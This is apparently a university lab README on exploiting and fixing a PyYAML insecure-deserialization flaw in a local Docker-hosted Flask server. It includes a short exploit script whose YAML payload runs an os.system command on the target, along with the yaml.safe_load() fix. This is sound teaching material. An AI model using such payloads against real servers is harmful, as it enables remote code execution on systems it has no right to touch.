# CS180-Final
📚 CTF Lab: CVE Exploration & Live Demo
Objective
In this lab, you investigate a real-world CVE (Common Vulnerabilities and Exposures), build a vulnerable environment to demonstrate exploitation, and apply a remediation to fix the issue.
The goal is to walk through discovering, exploiting, and securing a system in a controlled, demonstrable way using Docker.

Lab Overview
CVE Selection:
This lab is based on a Python deserialization vulnerability similar to CVE-2017-18342 affecting PyYAML.

Vulnerability Understanding:

What: Insecure deserialization in Python applications using yaml.load().

Why: yaml.load() processes untrusted input without restrictions, allowing arbitrary code execution.

How Exploited: Sending a crafted YAML payload that executes system commands.

How Remediated: Replace yaml.load() with yaml.safe_load(), which only parses simple, safe data.

Lab Setup and Execution
1. 🔥 Shut Down and Remove All Docker Containers
Before starting fresh:

bash
Copy
Edit
sudo docker stop $(sudo docker ps -q)
sudo docker rm $(sudo docker ps -a -q)
2. 🐳 Build and Run the Vulnerable Docker Environment
Build the vulnerable image:

bash
Copy
Edit
sudo docker build -f Dockerfile -t vulnerable-server .
Run the vulnerable container:

bash
Copy
Edit
sudo docker run -d -p 5000:5000 --name vulnerable-container vulnerable-server
3. 🌐 Access the Vulnerable Server
Visit:

arduino
Copy
Edit
http://localhost:5000/
You should see the vulnerable web page running.

4. ⚡ Exploit the Vulnerability
Use the provided exploit_script.py:

bash
Copy
Edit
python3 exploit_script.py
✅ The script will exploit the insecure deserialization and trigger arbitrary code execution on the server.

5. 🔧 Apply the Fix (Remediation)
Find the container ID if needed:

bash
Copy
Edit
sudo docker ps -a
Stop and remove the vulnerable container:

bash
Copy
Edit
sudo docker rm -f {Current ID}
Build the fixed server:

bash
Copy
Edit
sudo docker build -f DockerfileFixed -t fixed-server .
Run the fixed container:

bash
Copy
Edit
sudo docker run -d -p 5000:5000 --name fixed-container fixed-server
6. 🌐 Access the Fixed Server
Visit again:

arduino
Copy
Edit
http://localhost:5000/
The server is now patched against insecure YAML deserialization.

7. ⚡ Test Exploit Again
Try running exploit_script.py again:

bash
Copy
Edit
python3 exploit_script.py
✅ The exploit should now fail, showing that the vulnerability has been successfully remediated.

Scripts Overview
🛠 Exploit Script: exploit_script.py
A Python script that sends a malicious YAML payload to the vulnerable server to trigger code execution.

python
Copy
Edit
import requests

url = 'http://localhost:5000/'
payload = {'data': '!!python/object/apply:os.system ["echo hacked > /tmp/hacked"]'}
response = requests.post(url, data=payload)
print(response.text)
🛡 Remediation Server: fixed_server.py
The fixed server uses yaml.safe_load() to prevent exploitation:

python
Copy
Edit
import yaml
from flask import Flask, request

app = Flask(__name__)

@app.route('/', methods=['POST'])
def safe_endpoint():
    try:
        data = yaml.safe_load(request.data)
        return f"Received data: {data}", 200
    except yaml.YAMLError as e:
        return f"Error processing data: {str(e)}", 400

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
Docker Setup
🐳 Dockerfile (Vulnerable Server)
Dockerfile
Copy
Edit
FROM python:3.8-slim

WORKDIR /app

COPY . /app

RUN pip install --no-cache-dir Flask PyYAML

CMD ["python", "vulnerable_server.py"]
🛡 DockerfileFixed (Fixed Server)
Dockerfile
Copy
Edit
FROM python:3.8-slim

WORKDIR /app

COPY . /app

RUN pip install --no-cache-dir Flask PyYAML

CMD ["python", "fixed_server.py"]
Submission Checklist ✅
Make sure you submit:

exploit_script.py

fixed_server.py

vulnerable_server.py

Dockerfile

DockerfileFixed

README.md (this file)

Everything must be packaged neatly into a .zip or submitted directly via your class platform by April 28, 2025.

Final Notes
Before Remediation:
The exploit works and shows the server can be hacked.

After Remediation:
The server blocks the malicious payload and shows an error or sanitized message.

This lab demonstrates the importance of safe data parsing in applications — especially when handling external input!

🎯 Good Luck and Happy Hacking!
